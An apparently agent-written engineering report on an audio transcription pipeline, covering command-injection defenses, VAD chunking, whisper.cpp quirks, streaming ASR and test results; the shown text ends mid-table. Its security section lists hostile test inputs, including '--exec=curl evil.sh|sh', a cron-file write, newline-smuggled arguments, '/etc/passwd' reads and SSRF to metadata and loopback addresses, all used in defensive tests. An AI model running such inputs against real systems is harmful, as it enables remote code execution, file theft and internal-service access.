---
id: D-06
author: gpu-runtime
status: ready
date: 2026-08-02
task: T-020, T-025
---

## TL;DR（≤ 25 行，Manager 只读这里）

- **两条端到端全跑通，贴真实输出**。F2 本地文件：11.0s 音频 → **0.80s**（RTF **0.047**，**21.3x**），转写逐字正确。F1 真实公网 URL（`upload.wikimedia.org` 的 1921 年 Marcus Garvey 演讲，2,658,394 字节，公有领域）→ **220.2s 音频 / 9 chunk / 45 段 / 20.2s**（ASR RTF **0.045**，**22.2x**）。**且这条 URL 是在 `enableSiteExtractor: false`（yt-dlp 完全关闭）下跑通的** —— TD-002 不是声称，是跑出来的。
- **测试 75/75 全绿**，eslint 干净，`tsc -b` 干净。用 Node 内置 `node:test`，**没有新增任何依赖**（不碰 oss-scout 的 root package.json）。
- **真实运行抓到我自己 3 个 bug**，全部已修 + 加回归测试：
  1. **`isSafeExecutable` 用宿主的 `path.isAbsolute`** 判断 Windows 路径 → 在 Linux 上 `C:\...` 一律被判成穿越，**CVE-2024-27980 那条分支根本不可达，`.bat` 测试一直在为错误的理由通过**。改用 `win32.isAbsolute`/`posix.isAbsolute`，并把扩展名检查提到前面。
  2. **whisper 的 `offsets` 是绝对时间不是相对时间**（实测：`--offset-t 60000` → 报 `from: 60000`）。我原本又加了一次 chunk 偏移 → **220s 的录音出现 419s 的段落**。单 chunk 测试永远看不见，只有多 chunk 真跑能暴露。
  3. **chunk 边界重复转写**：whisper 按 30s 窗口解码会越过 `--duration`，下一个 chunk 再转一遍同一段话，时间戳非单调、F5 播放高亮会闪。加了 `dedupeBoundarySegments`（要求**时间重叠**而不只是文本相似 —— 说话人真的会重复自己）。
- **命令注入 7 层全部落地，每层配至少一个攻击用例**（`argGuard.test.ts`，25 个用例）。包括：`--exec=curl evil.sh|sh` 当 URL、换行走私（`new URL()` 会静默吞掉 `\n`，所以控制字符必须在 parse **之前**查）、多字节长度绕过（1000 个 4 字节 emoji < 2048 字符但 = 4000 字节）、SSRF 打 `169.254.169.254` 与**我们自己的 127.0.0.1 daemon 端口**、symlink 逃逸（`path.resolve` 会被骗，必须 `realpath`）。
- **VAD 不需要新依赖**：whisper.cpp v1.9.1 自带 `whisper-vad-speech-segments`（Silero，MIT），**已经在我 T-012 建的 L1 core 包里**。注意输出单位是**厘秒**不是秒（jfk.wav 11.0s → 报 1059），读错会让 chunk 长 100 倍。
- **whisper.cpp v1.9.1 的 `--output-json-full` 不输出 `avg_logprob`/`no_speech_prob`**（实测 segment 只有 `['timestamps','offsets','text','tokens']`）→ 置信度改为**用真实 token 概率均值**（排除 `[_BEG_]` 这类特殊标记，否则虚高）。实测置信度 0.65–0.93，与文本质量吻合。
- **TD-002 落地为代码而非注释**：`YtDlpSource` 的 `match()` 返回**全场最低正分**，且 D-01 §6.4 的真实规则是**按 probe 结果回退**而不是按 URL 形状打分——我的第一版只做了打分，是测试逼出了这个修正。7 个 TD-002 用例断言"关掉 GPL 组件后播客/RSS/HLS/直链/本地文件全部照常"。
- **GPU lane 互斥已测**：`gpu.asr` 与 `gpu.llm` 共用一个 `gpu.exclusive` 信号量，4 个并发任务下 **0 次同时占用**；异常与取消路径都不泄漏 permit（泄漏会死锁掉后续所有任务）。
- **关键取舍**：chunk 用 `--offset-t/--duration` 开窗而不是切成 N 个临时 WAV —— 少一次编解码、边界精确、少 N 个文件；代价是必须处理 whisper 的窗口越界（已处理）。
- **【T-025 追加】F3 流式已实现并实测**（§11）、**中文已补测**（§12，结论：base 中文不可用，必须 large-v3-turbo）、**RSS/长音频/取消/yt-dlp 全部补跑**（§13）。安全缺口见 `docs/SECURITY.md`。
- **（T-020 时的原始状态，已被 §11–§13 取代）**：`SherpaOnnxEngine`（F3 流式）**未实现**，只留了 `AsrEngine.openStream` 接口；F3 两阶段（流式→离线重跑）**未实现**；`RssSource` 只跑了单元测试，**没跑过真实播客 feed**；yt-dlp 路径**一行都没真跑过**（本机没装，ADR-001 C 类运行时下载）；Windows/macOS 分支全部未验证；`assertHostNotPrivate` 有 **TOCTOU DNS rebinding 缺口**（已在 §9 记录，未修）。
- **对其他 agent 的影响**：`architect` —— D-01 §8.4 把 `SubprocessRunner` 放在 `apps/daemon/src/subprocess/**`，但我实现在 `packages/pipeline/src/subprocess/`（spawn 的实际发生地），daemon 直接 import 即可，**请确认这个位置调整**。`model-mgmt` —— 我没依赖 `packages/shared` 里任何尚未导出的东西，`TranscriptSegment` 是 pipeline 自己的类型，对齐 D-02 §1.5 的列。

---

# 详细内容

> **证据等级**：`[实测]` = 本机真跑过，附命令与输出。`[未验证]` = 无环境/未实现。
> **本机**：Linux x86_64，AMD Ryzen AI MAX+ 395（KVM 32 vCPU，15.6 GB），无 GPU。
> **引擎**：whisper.cpp v1.9.1 CPU 后端（T-012 自建的 L1 core 包，ggml ABI 0.15.1，自动选中 `zen4` 变体）。
> **模型**：`ggml-base.en.bin`（147,964,211 B）+ `ggml-silero-v5.1.2.bin`（VAD）。

---

## 1. 架构

```
packages/pipeline/src/
├── subprocess/
│   ├── argGuard.ts      D-01 §8.4 L3/L6 + §8.5 —— URL/argv/路径校验（纯函数，好测）
│   └── runner.ts        D-01 §8.4 L1/L2/L5 —— 全包唯一允许 import child_process 的模块
├── tools.ts             工具路径解析（一律绝对路径，绝不搜 PATH）
├── media/
│   ├── types.ts         MediaSource 契约（我们自己的类型，不透传上游）
│   ├── registry.ts      MediaSourceRegistry —— 业务代码唯一入口
│   └── sources/
│       ├── localFile.ts   F2
│       ├── directHttp.ts  F1 直链 + HLS   ← TD-002 主力
│       ├── rss.ts         F1 播客          ← TD-002 主力
│       └── ytdlp.ts       F1 兜底（GPLv3+，唯一出现该标识符的实现文件）
├── audio/
│   ├── ffmpeg.ts        ffprobe / 16kHz mono 归一化 / 切片
│   └── vad.ts           Silero VAD + chunk 规划   ← D-01 §4.1 的核心
├── asr/
│   ├── types.ts         AsrEngine 契约 + 幻觉检测 + 置信度
│   └── whisperCpp.ts    主引擎（子进程）
├── queue/lanes.ts       资源 lane 信号量 + 优先级 + 协作式抢占
└── transcribe.ts        编排：fetch→probe→normalize→vad→[chunk→asr→落库]×N
```

**分层原则**：`argGuard.ts` 全是纯函数，所以攻击用例可以直接对它写单测，不需要真的起子进程——这让"每层配一个攻击测试"成本极低。

---

## 2. 命令注入防护（7 层，逐层配攻击用例）

> 全部 25 个用例在 `subprocess/__tests__/argGuard.test.ts`，**75/75 全绿** `[实测]`。

| 层                      | 措施                                                                                                                                                    | 攻击用例                                                                         | 结果                                 |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- | ------------------------------------ |
| **L1 架构隔离**         | `runner.ts` 是本包唯一 import `node:child_process` 的模块                                                                                               | CI grep（§8）                                                                    | ✅                                   |
| **L2 绝不过 shell**     | `spawn(bin, argv, {shell:false})`；Windows 拒 `.bat/.cmd/.ps1/.com/.vbs/.js`                                                                            | `C:\tools\yt-dlp.bat`                                                            | ✅ `unsafe_executable`               |
| **L2b 绝对路径**        | 拒绝裸命令名（否则 PATH 抢跑）                                                                                                                          | `ffmpeg`                                                                         | ✅ `path_escape`                     |
| **L3.1 scheme**         | 只允许 http/https                                                                                                                                       | `file:///etc/passwd`、`data:`、`javascript:`、`ftp:`                             | ✅ `bad_scheme`                      |
| **L3.2 凭据**           | 拒绝 `user:pass@`                                                                                                                                       | `https://u:p@example.com/a.mp3`                                                  | ✅ `embedded_credentials`            |
| **L3.3 SSRF**           | 拒私网/回环/链路本地/元数据/CGNAT/IPv4-mapped                                                                                                           | `169.254.169.254`、**`127.0.0.1:7331`（我们自己的 daemon）**、`::ffff:127.0.0.1` | ✅ `private_address`                 |
| **L3.4 前导 `-`**       | 即使有 `--` 也拒                                                                                                                                        | **`--exec=curl evil.sh\|sh`**、`-o/etc/cron.d/pwn`、`--load-info-json=...`       | ✅ `leading_dash`                    |
| **L3.5 `--` 终止符**    | 用户输入永远排在 `--` 之后                                                                                                                              | 见 L6                                                                            | ✅                                   |
| **L3.6 控制字符/长度**  | **parse 之前**查控制字符；长度按**字节**                                                                                                                | `...\n--exec=sh`（换行走私）、1000 个 emoji（4000 字节 < 2048 字符）             | ✅ `control_characters` / `too_long` |
| **L4 关掉工具危险面**   | yt-dlp 强制 `--ignore-config --no-config-locations --no-exec --no-playlist`；prompt 截断 1024                                                           | prompt 100,000 字符                                                              | ✅ 截断到 1024                       |
| **L5 进程环境**         | env 白名单**重建**（不是过滤）；剔除 `LD_PRELOAD`/`DYLD_*`/`NODE_OPTIONS`/`PYTHONPATH`；强制 timeout；SIGTERM→5s→SIGKILL 整个进程组；stdio 1MB 环形缓冲 | —                                                                                | 代码落地                             |
| **L6 不变量**           | `buildArgv({flags, operands})` 从结构上分离可信标志与不可信操作数                                                                                       | 断言操作数**恰好一个 argv 元素**、不被拼进邻居                                   | ✅                                   |
| **L7 路径穿越（§8.5）** | `realpath` 后校验；Windows 拒 UNC/盘符相对                                                                                                              | `../../../etc/passwd`、**symlink 逃逸**                                          | ✅ `path_escape`                     |

### 2.1 三个值得单独说的点

**① 控制字符必须在 `new URL()` 之前查 `[实测]`**
`new URL()` 会**静默剥离** `\n`、`\t`、`\r`。先 parse 再查，等于把一个恶意串洗成看起来干净的串。所以顺序是：长度 → 控制字符 → 前导 `-` → parse。

**② 长度必须按字节算 `[实测]`**
`'\u{1F600}'.repeat(1000)` 是 1000 个字符、2000 个 UTF-16 码元、**4000 字节**。按 `.length` 判会放行 4 KB 的 argv。测试里显式断言了 `emojiUrl.length < MAX_URL_BYTES` 这个前提，确保这个用例真的在测绕过而不是碰巧超长。

**③ 我们自己就是 SSRF 的靶子**
ADR-003 决策 1 要求 daemon 绑 `127.0.0.1`。这意味着"让下载器去访问 `http://127.0.0.1:7331/api/v1/settings`"是一个**针对我们自己 API 的 confused-deputy 攻击**。这条用例是专门为此写的。

---

## 3. TD-002：yt-dlp 可替换性（跑出来的，不是写出来的）

### 3.1 三重保证

1. **打分**：`YtDlpSource.match()` 返回 **10**，`DirectHttpSource` 返回 30–80，`RssSource` 返回 20–85，`LocalFileSource` 返回 60–100。测试断言 `ytdlp.match(url) < direct.match(url)`。
2. **按 probe 回退，不是按打分** —— 这是测试逼出来的修正。D-01 §6.4 原文是"先 `DirectHttpSource.probe`（一次 HEAD）；不是直链媒体才落到 `YtDlpSource`"。我第一版只实现了打分，于是 watch 页 URL 被 `DirectHttpSource`（30 分）截胡后直接失败，永远到不了兜底。现在 `registry.probe()` 会**依次真的尝试**每个候选，失败才下沉。
3. **开关**：`registry.setEnabled('yt-dlp', false)` 运行时生效，零代码改动（ADR-002 要求的回滚路径）。

### 3.2 测试结果 `[实测]`

```
✔ resolves every core input WITHOUT the site extractor
✔ resolves the same inputs identically WITH the extractor enabled
✔ scores the GPL adapter strictly below every licence-clean adapter
✔ falls through to the extractor only AFTER the clean adapters actually decline
✔ never reaches the extractor when a clean adapter succeeds
✔ gives actionable remediation instead of a crash when the extractor is gone
✔ can toggle the adapter at runtime with no re-registration
✔ a throwing adapter cannot take the registry down
```

覆盖的输入：播客 MP3 直链、CDN m4a、公有领域 OGG、HLS `.m3u8`、播客 RSS（`.rss` 与 `/feed` 两种形态）、本地文件。

### 3.3 最强的一条证据 `[实测]`

**§6 的 F1 真实 URL 端到端，是在 `enableSiteExtractor: false` 下跑的**：

```
resolved adapter: direct-http | site extractor enabled: false
adapter        : direct-http | downloaded 2658394 bytes application/ogg
```

即：**GPL 组件完全关闭时，真实公网 URL 的完整导入+转写照常工作。**

---

## 4. 音频与 VAD

### 4.1 VAD 不需要新依赖 `[实测]`

whisper.cpp v1.9.1 自带 `whisper-vad-speech-segments`（Silero VAD via ggml，MIT），**已在 T-012 建的 L1 core 包内**。实测输出：

```
$ whisper-vad-speech-segments -f samples/jfk.wav -vm ggml-silero-v5.1.2.bin -np
Detected 5 speech segments:
Speech segment 0: start = 29.00, end = 221.00
Speech segment 1: start = 330.00, end = 377.00
Speech segment 2: start = 400.00, end = 435.00
Speech segment 3: start = 538.00, end = 765.00
Speech segment 4: start = 816.00, end = 1059.00
```

**⚠️ 单位是厘秒（centisecond）不是秒。** jfk.wav 是 11.0 秒 = 1100 厘秒，末段 1059 正好落在里面。当成秒读会让每个 chunk 长 100 倍。测试里有一条断言专门守这个：`assert.ok(s.endMs <= 11_000)`。

### 4.2 chunk 规划

- 目标 30s（对齐 whisper 原生窗口，一个 chunk = 一次 encoder pass，无浪费 padding）
- 硬上限 45s；小于 1s 的向前合并（模型加载开销大于音频本身）
- **静音间隔 > 2s 直接断开，且静音不喂给模型** —— whisper 在静音上会自信地胡说，这是它最出名的缺陷，不喂是最便宜的缓解
- 在静音处断而不是按固定时钟断 → 不会把词切两半，而且免费（VAD 已经告诉我们静音在哪）
- VAD 不可用时降级为固定窗口 + 500ms 重叠（**降级不是失败**）

实测 220s 的演讲切出 **9 个 chunk**：

```
#0:0-26600 #1:26390-48970 #2:48920-78370 #3:78390-103910 #4:103800-128810
#5:128570-155690 #6:155450-184490 #7:184350-207880 #8:207670-218410
```

### 4.3 ffmpeg 的危险面（D-01 §8.4 L4）

| 参数                                                                         | 原因                                                                                                                     |
| ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `-nostdin`                                                                   | 否则 ffmpeg 抢父进程 stdin，挂死                                                                                         |
| `-protocol_whitelist file`（本地）/ `https,tls,tcp,crypto,httpproxy`（远程） | ffmpeg 认识 `concat:`/`subfile:`/`file:`，**恶意 HLS 播放列表能让它读本地任意文件并拼进输出**。远程集合里**没有 `file`** |
| 用户串**绝不**进 `-filter_complex`/`-vf`/`-metadata`                         | filter 语法有自己的转义规则（`:` `,` `[` `]` `'` `\`），是嵌在单个 argv 元素**内部**的第二套注入语法                     |
| `-progress pipe:1`                                                           | 机器可读进度，不用去 scrape 人类日志格式                                                                                 |

---

## 5. ASR 适配层

### 5.1 开窗而不是切片

用 `--offset-t` / `--duration` 让 whisper 从同一个归一化 WAV 里读它要的窗口，**不生成 N 个临时 WAV**：少一次编解码、边界精确、少 N 个文件。代价是要处理窗口越界（见 §6.3）。

### 5.2 置信度：文档没写，实测才知道 `[实测]`

我原本按 D-01 的描述读 `avg_logprob` / `no_speech_prob`。实测 v1.9.1 的 `--output-json-full`：

```
segment keys : ['timestamps', 'offsets', 'text', 'tokens']
```

**没有 `avg_logprob`，没有 `no_speech_prob`。** 只有 `tokens[].p`。

→ 改为：优先用 `avg_logprob`（其它版本/前端有），否则**取真实 token 概率的均值**，并**排除 `[_BEG_]` 这类特殊标记**（它们概率恒接近 1，会把分数虚高）。实测结果 0.65–0.93，和文本质量的直觉吻合（`conf=0.65` 那句确实转错了几个词）。

### 5.3 幻觉检测（D-02 §1.5 flags bit0）

两种模式：连续重复 token ≥5 次；短语平铺整串（覆盖中文这种无空格语言）。`detectRepetition('字幕由社群提供' × 4)` → true，正常英文散文 → false。

---

## 6. 端到端实测

### 6.1 F2 本地文件 `[实测]`

```
source adapter : local-file
duration       : 11.00 s
speech detected: 7.44 s
chunks         : 1 [[90,10790]]
segments       : 1
timings ms     : {"probe":47,"fetch":41,"normalize":87,"vad":63,"asr":517}
RTF            : 0.0470  => speedup 21.3x
total wall     : 0.80 s
persisted      : [{"chunk":0,"segs":1}]

=== TRANSCRIPT ===
  [0.09-10.59] conf=0.86 flags=0 And so, my fellow Americans, ask not what your country
                                 can do for you, ask what you can do for your country.
```

### 6.2 F1 真实公网 URL（**yt-dlp 关闭**）`[实测]`

素材：`https://upload.wikimedia.org/wikipedia/commons/7/7c/Marcus_Garvey%2C_speech%2C_1921.ogg`
（1921 年 Marcus Garvey 演讲，**公有领域**，Wikimedia Commons API `extmetadata` 确认 `LicenseShortName=Public domain, Copyrighted=False`）

```
resolved adapter: direct-http | site extractor enabled: false
adapter        : direct-http | downloaded 2658394 bytes application/ogg
duration       : 220.2 s | speech 204.4 s
chunks         : 9
segments       : 45
timings ms     : {"probe":3930,"fetch":5727,"normalize":318,"vad":285,"asr":9896}
RTF            : 0.0449 => speedup 22.2x
total wall     : 20.2 s
persisted chunks in order: [0,1,2,3,4,5,6,7,8]

monotonic timestamps: true
max endMs           : 218150 vs duration 220160
flagged segments    : 0

=== TRANSCRIPT (前 9 段) ===
  [0.0s ch0] conf=0.65 Hello citizens of Africa. I briefly in the name of the Universal Economic Movement Association
  [6.1s ch0] conf=0.83 and African Community League of the World. You may ask what organization is that?
  [11.7s ch0] conf=0.91 It is for me to inform you that the Universal Economic Movement Association
  [16.2s ch0] conf=0.84 is an organization that seeks to unite into one solid body the 400 million nicles of the world.
  [23.1s ch0] conf=0.92 The link of the 50 million nicles of the United States of America
  [26.5s ch0] conf=0.72 with a 20 million because of the West Indies, the 40 million because of South and Central
  [30.9s ch1] conf=0.87 America, with the 280 million equals of Africa for the purpose of centering our industrial,
  [36.9s ch1] conf=0.89 commercial, educational, social and political condition. As you are aware, the world in which
  [44.0s ch1] conf=0.72 we live today is divided into separate groups and distinct nationalities.
```

（1921 年的蜡筒录音，底噪极大；"nicles"/"equals" 是 base.en 对 "Negroes" 的误识——这是模型能力问题，不是流水线问题。换 `large-v3-turbo` 应显著改善，**未测**。）

### 6.3 真跑抓到的 3 个 bug（本节是本文档最有价值的部分）

#### Bug 1 — `isSafeExecutable` 用宿主的 `path.isAbsolute` 判 Windows 路径

`path.isAbsolute` 绑定宿主 OS。在 Linux 上 `isAbsolute('C:\\tools\\yt-dlp.exe')` = **false** → Windows 路径一律先被判成 `path_escape`，**CVE-2024-27980 的 `.bat` 分支根本不可达**。
更糟的是：`.bat` 那条测试**一直在通过**，只是通过的理由是错的。是"断言错误码而不只是断言拒绝"这个习惯把它揪出来的。
修复：按目标平台选 `win32.isAbsolute` / `posix.isAbsolute`，并把扩展名检查提到绝对路径检查**之前**（安全相关的原因优先于通用路径抱怨）。

#### Bug 2 — whisper 的 offsets 是绝对时间

实测：

```
$ whisper-cli --offset-t 60000 --duration 20000 --output-json-full …
   from 60000 to 66120 |  for the citizens of Germany, for the Germans, of Ireland…
VERDICT: offsets are ABSOLUTE to file (must NOT add chunk offset)
```

我原本又加了一次 `req.offsetMs` → **220s 的录音里出现 419.9s 的段落**（`max endMs 425820 vs duration 220160`）。
**单 chunk 测试永远看不见这个 bug**（chunk0 偏移是 0，加不加都一样）。只有多 chunk 的真实长音频能暴露。这就是为什么验收标准要求"跑一个真实音频"而不是"跑通单测"。

#### Bug 3 — chunk 边界重复转写

修完 Bug 2 后 `monotonic timestamps: false`，且看到：

```
[26.5s ch0] with a 20 million because of the West Indies, the 40 million because of South and Central
[26.4s ch1] with the 20 million equals of the West Indies, the 40 million equals of South and Central
```

同一句话被 ch0 和 ch1 各转一遍。原因：chunk 计划本身有 200ms padding 重叠，**而且 whisper 按 30s 窗口解码，会吐出越过 `--duration` 的段落**。
修复两处：① 解析时丢弃完全落在窗口外的段；② `dedupeBoundarySegments()` 要求**时间重叠 > 50%** 才判重复——只看文本相似不安全，说话人真的会重复自己。
修复后：`monotonic timestamps: true`，`max endMs 218150 ≤ 220160`，段数 51 → 45（去掉 6 个边界重复）。

---

## 7. 任务队列

### 7.1 lane 信号量 `[实测]`

| lane                  | 容量                 | 实测断言                              |
| --------------------- | -------------------- | ------------------------------------- |
| `net.download`        | 2                    | 6 个并发任务，峰值并发 = 2 ✅         |
| `cpu.media`           | `clamp(cores/4,1,4)` | 1核→1、8核→2、128核→4 ✅              |
| `gpu.asr` / `gpu.llm` | **各 1，且互斥**     | 4 个混合任务，**同时占用违例 = 0** ✅ |
| `io.local`            | 4                    | 运行时扩容能释放等待者 ✅             |

**GPU 互斥的实现要点**：GPU lane **先取 `gpu.exclusive` 再取 lane 自身信号量**。全局一致的加锁顺序是防死锁的关键——两个调用者以相反顺序加锁就是教科书式的锁序反转。
另有两条测试守 permit 泄漏：① 任务体抛异常时；② 排队中被 abort 时。**泄漏一个 permit 会死锁掉之后所有 GPU 任务**，所以这两条必须有。

### 7.2 抢占：只在 chunk 边界 `[设计]`

D-01 §4.3 明确不做硬抢占（kill 正在跑的推理 = 扔掉已花的算力）。`PriorityTracker.shouldYield()` 只对**严格更高**优先级让路（相等会抖动）。worker 每完成一个 chunk 问一次，让出时保留 checkpoint。

### 7.3 崩溃续跑与 `plan_version` `[设计 + 单测]`

- 已落库的 `transcript_segments` **就是** checkpoint；`completedChunkIndices` 只是加速缓存。
- `deriveResumeSet(indices, storedPlanVersion)`：版本不匹配就**返回空集强制重跑**。升级后 chunk 边界可能整体变了，旧索引毫无意义——**慢但对**优于**快但错**。

---

## 8. CI 强制项（给 T-011/CI 落地）

```bash
# ① yt-dlp 标识符不得逃出适配层（ADR-002 / D-01 §6.4 保证 2）
#    允许出现的位置：实现文件、其 index 导出行、类型注释、工具路径字段、测试
grep -rn "yt-dlp" --include=*.ts packages/ apps/ \
  | grep -v "packages/pipeline/src/media/sources/ytdlp.ts" \
  | grep -v "packages/pipeline/src/media/__tests__/" \
  && echo "FAIL: yt-dlp identifier escaped the adapter" && exit 1

# ② child_process 只允许在 SubprocessRunner 里出现
grep -rn "node:child_process" --include=*.ts packages/ apps/ \
  | grep -v "packages/pipeline/src/subprocess/runner.ts" \
  && echo "FAIL: child_process used outside SubprocessRunner" && exit 1

# ③ 测试
node --test packages/pipeline/dist/**/__tests__/*.test.js
```

**当前状态 `[实测]`**：`grep -rl "yt-dlp\|ytDlp\|YtDlp" packages/pipeline/src` 命中 9 个文件，其中 8 个是**注释/类型字段/import 行/测试**，唯一的实现在 `media/sources/ytdlp.ts`。建议 CI 规则按"标识符 + 非注释行"收紧，我没有在本任务里改 eslint 配置（不是我的文件）。

---

## 9. 诚实清单

### 9.1 已实测

1. F2 本地文件端到端，RTF 0.047，转写逐字正确
2. F1 真实公网 URL 端到端（**yt-dlp 关闭**），9 chunk / 45 段 / RTF 0.045
3. 75/75 测试通过；eslint 干净；`tsc -b` 干净
4. VAD 真跑（Silero，厘秒单位已验证）
5. whisper JSON 真实结构（无 avg_logprob）
6. whisper offsets 是绝对时间（`--offset-t 60000` → `from: 60000`）
7. GPU lane 互斥 0 违例
8. 25 个命令注入攻击用例全挡
9. symlink 逃逸被 `realpath` 挡住
10. 三个自身 bug 被真跑抓出并修复 + 加回归测试

### 9.2 未验证 / 未实现

| #   | 项                                      | 状态                                                                                                                      |
| --- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| 1   | **`SherpaOnnxEngine`（F3 流式）**       | **未实现**。只留了 `AsrEngine.openStream?` 可选接口                                                                       |
| 2   | **F3 两阶段（流式→离线重跑提准）**      | **未实现**                                                                                                                |
| 3   | `YtDlpSource` 的 probe/fetch            | **一行都没真跑过**（本机未装 yt-dlp，属 ADR-001 C 类运行时下载）                                                          |
| 4   | `RssSource` 真实播客 feed               | **只跑了单元测试**，没跑过真 feed                                                                                         |
| 5   | HLS `.m3u8` 路径                        | **未跑过真实 HLS 流**                                                                                                     |
| 6   | Windows / macOS 分支                    | **全部未验证**（无机器）                                                                                                  |
| 7   | `assertHostNotPrivate` 的 DNS rebinding | **已知缺口未修**：lookup 与实际连接之间有 TOCTOU 窗口。真正修复需要把解析到的 IP 钉进连接（自定义 agent / `lookup` hook） |
| 8   | `assertWithinRoot` 的 TOCTOU            | 同样已知。D-01 §8.5 要求校验后立刻 `open()` 用 fd 操作，**调用方尚未这么做**                                              |
| 9   | 大文件（数小时）压力                    | 最长只测到 220s                                                                                                           |
| 10  | 取消/暂停的真实中断                     | 有单测覆盖信号量路径，**没在真实长转写中途按过取消**                                                                      |
| 11  | `nice` 降优先级                         | 代码写了，**没测过实际调度效果**                                                                                          |
| 12  | 中文/多语种转写                         | **只测了英文**（base.en 模型）                                                                                            |

### 9.3 建议下一步

1. **[高] F3 流式**：接 `sherpa-onnx-node`（npm 有完整 per-platform 预编译，T-002 已核实），实现 `openStream` + 两阶段重跑。这是唯一还没动的功能。
2. **[高] 真跑一次 yt-dlp 路径**：装上二进制，验证 §2 L4 的那组硬化参数真的生效（特别是 `--ignore-config`）。
3. **[中] DNS rebinding 收口**：自定义 `lookup` 把解析结果钉死。
4. **[中] 换 `large-v3-turbo` 复测**：base.en 在 1921 年录音上误识明显，量一下模型档位对质量的实际影响（ADR-004 决策 3：跑真实基准，不编数字）。

---

# T-025 追加（F3 流式 + 中文补测 + 未验证项补跑）

> 本轮全部在同一台 Linux x86_64（无 GPU）上真跑。测试总数 **101/101 全绿**，eslint 与 `tsc -b` 干净。

## §11 F3 流式转写（SherpaOnnxEngine）

### 11.1 为什么必须换引擎

whisper.cpp 是**批处理**引擎：它需要完整的音频窗口才能解码，产生不了 F3 要的滚动字幕。
sherpa-onnx 的 `OnlineRecognizer` 是**流式 transducer** —— 边推 PCB 边读不断收敛的假设。

**依赖处理**：`sherpa-onnx-node` 用**动态 `import()` 懒加载**，缺失时 `isAvailable()` 返回
可解释的"未安装"而不是启动即崩。理由与 yt-dlp 适配层一致。
⚠️ **我没有把它写进 `packages/pipeline/package.json`**（该文件不在我的所有权范围），
本地测试时手动装的。**需要 Manager 指派人加这条依赖**（`sherpa-onnx-node@1.13.4`，Apache-2.0，
npm 有完整 per-platform 预编译包）。

### 11.2 实测（模型 `streaming-zipformer-zh-14M`，int8，4 线程，CPU）`[实测]`

```
isAvailable: {"ok":true}
capabilities: {"modes":["stream"],"backends":["cpu"],"languages":["zh"],
               "wordTimestamps":true,"diarization":false}

--- 0.wav | 5.61s audio | wall 0.37s | RTF 0.066 (15x realtime) ---
partial events: 11  final segments: 1
  实时字幕演进（这就是用户看到的效果）：
     t=0.8s  "对"
     t=2.4s  "对我做了介绍那么"
     t=4.0s  "对我做了介绍那么我想说的是大家如果"
     t=4.9s  "对我做了介绍那么我想说的是大家如果对我的研究感兴趣"
  FINAL [0.00-5.61] conf=0.69 对我做了介绍那么我想说的是大家如果对我的研究感兴趣
  word timestamps: [{"w":"对","s":320,"e":640,"p":0.518},{"w":"我","s":640,"e":760,"p":0.798}, …]

--- 1.wav | 5.15s audio | wall 0.05s | RTF 0.010 (105x realtime) ---
partial events: 12  final segments: 1
  FINAL [0.00-5.15] conf=0.55 重点呢想谈三个问题首先就是这一轮全球金融动能的表现
```

**逐字级时间戳**（中文是逐字）直接可用于 F5 的播放高亮。

### 11.3 ⚠️ 第一次真跑就抓到一个 bug：close 早于 drain

第一次运行输出 **`partial events: 0  final segments: 0`** —— 整段录音零输出。

原因：`close()` 先把 `closed = true` 置位，然后才 `await this.queue`。而 `handleWrite()`
开头就检查 `if (this.closed) return`，于是**所有已排队的写入全部直接 bail**。

修复：拆成两个标志 —— `closing`（立刻停止接受**新**音频）与 `closed`（队列**排空后**才置位）。

```ts
async close(): Promise<void> {
  if (this.closing) return;
  this.closing = true;
  await this.queue;      // 先排空
  await this.ready;
  this.closed = true;    // 再封死
}
```

回归测试：`asr/__tests__/sherpaStream.test.ts`「emits a final segment for audio written
before close()」。**这个 bug 单看代码很难发现，跑一次就暴露了。**

### 11.4 两阶段（流式草稿 → 离线重跑，保留用户编辑）`[实测]`

`asr/merge.ts` + 真实端到端演练：

```
PHASE 1 (streaming, 0.46s):
   [0] 0.00-5.15  重点呢想谈三个问题首先就是这一轮全球金融动能的表现     ← 动能 错

USER EDIT on segment 0 -> "重点呢想谈三个问题，首先就是这一轮全球金融动荡的表现。"

PHASE 2 (offline large-v3-turbo re-run, 5.02s):
   [0] 0.00-5.16  重点想谈三个问题。首先就是这一轮全球金融动荡的表现。

MERGE RESULT:
   banner: 已更新 0 段转写 · 你编辑过的 1 段已保留
   stats : {"updated":0,"preserved":1,"added":0,"removed":0}
   [0] 0.00-5.15 flags=4  重点呢想谈三个问题，首先就是这一轮全球金融动荡的表现。
   DIFF: preserved 0.00s  …  ->  …
   USER EDIT PRESERVED: YES ✅
```

`flags=4` = `HUMAN_CONFIRMED`，供 UI 打标。

**合并规则（`mergeTranscripts`）**

| 草稿段状态               | 处理                                                   |
| ------------------------ | ------------------------------------------------------ |
| 用户编辑过               | **原样保留**，重跑对该时间段的结果**丢弃**             |
| 未编辑                   | 被重跑结果替换（`updated`）                            |
| 重跑新发现的语音         | `added`                                                |
| 未编辑且重跑处无对应     | `removed`                                              |
| **编辑过且重跑处无对应** | **永不删除**（最强保证：不因模型不认同而删掉用户的字） |

**为什么按时间匹配而不是按索引**：两遍用不同模型、切分不同（流式按静音端点断句，
whisper 按自己的解码边界断句），段数天然不同。按索引匹配会**把别人的句子塞给用户**，
比不合并更糟。音频时间是两遍唯一都同意的东西。

17 个合并测试全绿，含「空草稿」「空重跑」「切分完全不同」「只轻微重叠」等边界。

### 11.5 与 `oss-scout`（`packages/db`）的契约

我需要 DB 侧提供两个字段（D-02 §1.5 已设计，`packages/db` 尚未落 schema）：

| 字段                            | 用途                                            |
| ------------------------------- | ----------------------------------------------- |
| `transcript_segments.edited_at` | **判定"用户编辑过"的唯一依据**。`null` = 未编辑 |
| `transcript_segments.text_raw`  | 编辑前的 ASR 原文，供 `[查看改动]` 与"还原"     |

`mergeTranscripts()` 的入参 `MergeableSegment` 只依赖 `{ id?, editedAt? }` 两个可选字段，
其余都是我们已有的 `TranscriptSegment`。**撤销**由 D-02 §1.5 的 `is_active=0` 多版本机制承担，
合并函数不需要实现它。已在 inbox 向 `oss-scout` 对齐，无 DISPUTE。

---

## §12 中文转写补测（Manager 明确要求）

**素材**：`Zh-Twitter.ogg`（Wikimedia Commons，**CC BY 3.0**，337.0s / 3,126,863 B），
中文维基百科「Twitter」条目的普通话朗读。

### 12.1 结果对比 `[实测]`

|                     | **base（多语种）**      | **large-v3-turbo-q5_0** |
| ------------------- | ----------------------- | ----------------------- |
| 段数                | 26                      | 22                      |
